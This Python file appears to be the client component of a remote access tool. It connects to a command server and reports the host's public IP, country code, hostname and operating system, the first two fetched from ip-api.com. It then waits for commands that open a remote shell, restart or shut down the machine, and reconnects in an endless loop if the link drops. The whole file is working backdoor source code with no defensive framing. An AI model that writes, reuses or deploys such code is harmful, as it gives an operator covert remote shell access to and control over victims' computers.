import socket
from client_folder.Modules import shell as Shell, power as Power
from time import sleep
import requests
import json
import platform

BUFFER_SIZE = 1024
RECONNECT_TIMER = 3


class Client:
    def __init__(self, ip, port):
        """
        This will initiate the connection to the server
        :param ip: ip address of the server
        :param port: port of the server
        """
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((ip, port))
        print('Connected successfully to the server')

    def close(self):
        """ Closes the connection to the server """
        self.client_socket.close()

    def send(self, message):
        """
        Sends a message in small chunks to the server
        :param message: Message to send to the server (bytes/str)
        """
        message = message.encode() if type(message) != bytes else message
        if len(message) % BUFFER_SIZE == 0:
            message = message + '.'.encode()
        while message:
            self.client_socket.send(message[:BUFFER_SIZE])
            message = message[BUFFER_SIZE:]

    def receive(self, as_bytes=False):
        """
        Recieve a message in small chunks from the Server
        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
        """
        chunk = self.client_socket.recv(BUFFER_SIZE)
        data = chunk
        while len(chunk) == BUFFER_SIZE:
            chunk = self.client_socket.recv(BUFFER_SIZE)
            if chunk != '.'.encode():
                data += chunk
        return data if as_bytes else data.decode()


def connect_to_server():
    """ Connects to the server and send it info about the system """
    try:
        # Connect to server
        client = Client('127.0.0.1', 8000)

        # Send client info to the server - IP, Country Code, Name, Os
        response = json.loads(requests.get('http://ip-api.com/json/?fields=status,countryCode,query').text)
        if response['status'] == 'success':
            client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform.platform()))

            # Respond to server requests
            while True:
                cmd = client.receive()
                if cmd == 'shell':
                    Shell.shell(client)
                elif cmd == 'restart':
                    Power.restart()
                elif cmd == 'shutdown':
                    Power.shutdown()
                else:
                    client.send('[!] Unconfigured option')
        else:
            print('Error obtaining client data... Trying to reconnect...')
            sleep(RECONNECT_TIMER * 10)
    except socket.error:
        print('Connection lost... Trying to reconnect...')
        sleep(RECONNECT_TIMER)


def main():
    while True:
        connect_to_server()


if __name__ == "__main__":
    main()
